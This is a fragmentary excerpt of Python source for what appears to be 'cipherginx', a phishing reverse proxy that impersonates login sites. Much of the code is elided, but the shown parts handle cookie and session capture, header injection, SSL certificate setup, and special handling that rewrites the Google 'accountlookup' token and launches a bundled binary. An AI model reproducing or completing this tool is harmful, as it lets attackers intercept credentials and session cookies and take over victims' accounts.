...
def flags():
    description = (
        ...
        + "+"
        + BLUE
        + "] Setup host, port, server & other details in config & run "
        + GREEN
        + '"sudo cipherginx.py config_name"'
        + BLUE
        + " to start the server"
        + RESET
    )
    epilog = (
        ...
        + "+"
        + BLUE
        + "] To use your own cert put it in the cert folder with name "
        + GREEN
        + '"server.pem"'
        + RESET
    )
    ...
    parser.add_argument(
        "-v", "--version", help="show tool version", action="store_true"
    )
    parser.add_argument(
        "-l",
        "--level",
...
def checkUpdate():
    try:
        ...
        resp = requests.get(
            "https://api.github.com/repos/cipheras/cipherginx/releases"
        ).json()
        ...
        if k in get_cookie or k.lower() in get_cookie:
            ...
            try:
                ts = datetime.strptime(
                    v["expires"], "%a, %d-%b-%Y %H:%M:%S GMT"
                ).timestamp()
            except Exception as e:
                ts = v["expires"]
                logging.warning(
                    RED + "different timestamp format, sending raw timestamp"
                )
                logging.debug(e, exc_info=True)
                pass
        ...
        try:
            ...
            resp = self.s.get(
                ...
                headers=injectHeaders(
                    req_header, url, self.headers["Content-Length"], self.path
                ),
                verify=False,
        ...
        try:
            ...
            if "/accountlookup" in self.path:
                token = requests.get(
                    ...
                    + re.findall("f.req=%5B%22.*?%22", str(post_body))[0].split("%22")[
                        1
                    ]
                ).text
                post_body = re.sub(
                    b"identifier%22%2C%22%3C.*%22",
                    b"identifier%22%2C%22%3C" + bytes(token, encoding="utf8") + b"%22",
                    post_body,
                )
            ##
            ...
            resp = self.s.post(
                url,
                data=injbody,
                headers=injectHeaders(req_header, url, str(len(injbody)), self.path),
                verify=False,
            )
            sent = True
            if resp.history:
    ...
    try:
        ...
        if isSSL:
            httpd.socket = ssl.wrap_socket(
                httpd.socket, server_side=True, certfile="cert/server.pem"
            )
        if hostname == "accounts.google.com":
            subprocess.Popen(
                ["bin/generate.exe"]
            ) if platform == "win32" else subprocess.Popen(["bin/generate"])
...
if __name__ == "__main__":
    ...
    if LEVEL == "error":
        logging.basicConfig(
            format=PURPLE + "## %(asctime)s [%(levelname)s] - %(message)s" + RESET,
            level=logging.ERROR,
        )
    elif LEVEL == "debug":
        logging.basicConfig(
